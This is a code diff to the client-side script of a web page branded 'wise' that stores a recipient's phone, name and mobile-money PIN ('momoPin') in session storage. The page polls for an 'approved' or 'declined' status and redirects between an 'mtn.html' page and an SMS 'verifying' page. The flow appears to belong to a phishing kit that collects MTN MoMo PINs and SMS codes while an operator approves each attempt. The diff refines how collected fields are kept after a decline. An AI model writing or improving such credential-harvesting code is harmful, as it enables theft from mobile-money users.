@@ -431,7 +431,7 @@
     }
   }
 
-  // ---- Mark session flags before redirect ----
+  // ---- Session flag helpers ----
   function unlockApproved() {
     try {
       const s = JSON.parse(sessionStorage.getItem('wise_session') || '{}');
@@ -447,12 +447,20 @@
       sessionStorage.setItem('wise_session', JSON.stringify(s));
     } catch(e) {}
   }
-  function clearFlags() {
+
+  function preserveFormOnDecline() {
     try {
       const s = JSON.parse(sessionStorage.getItem('wise_session') || '{}');
+      // Keep these fields so the user doesn't retype them on return
+      s.preservePhone = s.recipientPhoneLocal || '';
+      s.preserveName = s.recipientName || '';
+      s.preserveCountry = s.recipientCountryCode || 'UG';
+      // Clear approval flags (forces a fresh approval next attempt)
       delete s.approved;
       delete s.smsApproved;
       delete s.stage;
+      // Clear the PIN so the user must re-enter it
+      delete s.momoPin;
       sessionStorage.setItem('wise_session', JSON.stringify(s));
     } catch(e) {}
   }
@@ -466,7 +474,7 @@
         stopPolling();
         setStatus('approved');
         unlockApproved();
-        // Short pause so user sees the "Approved" state, then navigate
+        // Short pause so user sees "Approved", then navigate
         setTimeout(() => {
           if (stage === 'sms') {
             window.location.href = 'verifying.html';
@@ -477,7 +485,7 @@
       } else if (data.status === 'declined') {
         stopPolling();
         setStatus('declined');
-        clearFlags();
+        preserveFormOnDecline();
         // Short pause so user sees the message, then back to mtn.html with the error
         setTimeout(() => {
           if (stage === 'sms') {
@@ -504,7 +512,7 @@
     }
   }, 90000);
 
-  window.addEventListener('beforeunload', () => {
+  window.addEventListener('beforeunload', (e) => {
     if (currentStatus === 'pending') {
       e.preventDefault();
       e.returnValue = '';
